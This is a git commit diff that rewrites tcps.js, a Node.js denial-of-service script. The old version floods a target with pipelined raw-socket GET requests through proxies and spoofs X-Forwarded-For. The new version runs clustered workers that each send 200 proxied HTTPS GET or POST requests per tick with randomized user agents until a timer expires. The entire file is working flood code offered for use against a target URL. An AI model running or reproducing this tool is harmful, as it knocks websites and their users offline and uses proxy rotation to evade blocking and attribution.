e41f2841c5e44527c5a6db4e866a86796ff4117b
httpplain <147990607+httpplain@users.noreply.github.com>
2024-01-01 17:14:42 +0700

    Update tcps.js

--- tcps.js
+++ tcps.js
@@ -1,54 +1,70 @@
-process.on('uncaughtException', function() {});
-const net = require('net');
-const fs = require('fs');
-const url = require('url');
-const randstr = require('randomstring');
-const cluster = require('cluster');
-const acceptrand = [
-    "gzip",
-    "*",
-	"identity",
-	"deflate",
-	"compress",
-    "br"
-];
+var url = require('url');
+var fs = require('fs');
+var https = require('https');
+var HttpsProxyAgent = require('https-proxy-agent');
+var randua = require('fake-useragent');
+var cluster = require('cluster');
+var numCPUs = require('os').cpus().length;
 
-const randconnection = [
-    "keep-alive",
-    "close"
-];
+var proxies = fs.readFileSync('http.txt', 'utf8').match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
 
-var proxies = fs.readFileSync('http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
-//var ua2 = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
-var tarPOST = "http://"+process.argv[2]+":"+process.argv[3];
-var parsed = url.parse(tarPOST);
-if (cluster.isMaster){
-    for (let i = 0; i<process.argv[5]; i++){
-        cluster.fork();
+process.on('uncaughtException', (err) => {});
+process.on('unhandledRejection', (err) => {});
+
+var httpMethod = process.argv[4] ? process.argv[4].toUpperCase() : 'GET';
+var threadCount = process.argv[5] ? parseInt(process.argv[5]) : numCPUs;
+
+var options = {};
+var parsed = url.parse(process.argv[2]);
+const postdata = (l) => {
+    const a = 'abcdefJDJDKDkkkKAsbKAKAKSKKS92929!#))#?$!@)#);$;$)#)/@)#!#!";;";*;ghijklmnopqstuvwxyz0123459292926789';
+    let s = '';
+    for (let i = 0; i < l; i++) {
+        s += a[Math.floor(Math.random() * a.length)];
     }
-setTimeout(() => {
-process.exit(1);
-}, process.argv[4] * 1000);
+    return s;
 }
-//const AllUA = fs.readFileSync("header.txt", 'utf-8').toString().replace(/\r/g, '').split('\n'); //读取UA
-
-function spoof(){
-    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
+const uas = randua();
+parsed.method = httpMethod;
+parsed.headers = {
+  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+  'accept-encoding': 'gzip, deflate, br',
+  'accept-language': 'en-US;q=0.8,en;q=0.7',
+  'cache-control': 'no-cache',
+  'pragma': 'no-cache',
+  'upgrade-insecure-requests': 1,
+  'Connection': 'keep-alive',
+  'user-agent': uas
 }
 
-setInterval(function() {
-    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
-    proxy = proxy.split(':');
-    var socket = net.connect(proxy[1], proxy[0]);
-    socket.setKeepAlive(false, 0);
-    socket.setTimeout(5000);
-    for (let j = 0; j < 64; j++) {
-    socket.write('GET ' + tarPOST +' HTTP/1.1\r\nHost: '+ parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: ' + acceptrand[Math.floor(Math.random() * acceptrand.length)] + '\r\nConnection: ' + randconnection[Math.floor(Math.random() * randconnection.length)] + '\r\nX-Forwarded-For: spoof()\r\n\r\n');
-	}
-	socket.on('data', function() {
-        setTimeout(function() {
-            socket.destroy();
-            return delete socket;
-        }, 5000);
-    })
-});
+if (httpMethod === 'POST') {
+  parsed.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+}
+
+setTimeout(function() {
+  process.exit(1);
+}, process.argv[3] * 1000);
+
+if (cluster.isMaster) {
+  for (var i = 0; i < threadCount; i++) {
+    cluster.fork();
+  }
+} else {
+  setInterval(function() {
+    for (var i = 0; i < 200; i++) {
+      var requestOptions = { ...parsed, agent: new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]) };
+
+      if (httpMethod === 'GET') {
+        https.get(requestOptions, function(res) {
+          console.log(res.statusCode);
+        });
+      } else if (httpMethod === 'POST') {
+        var req = https.request(requestOptions, function(res) {
+          console.log(res.statusCode);
+        });
+        req.write(postdata(6));
+        req.end();
+      }
+    }
+  });
+}
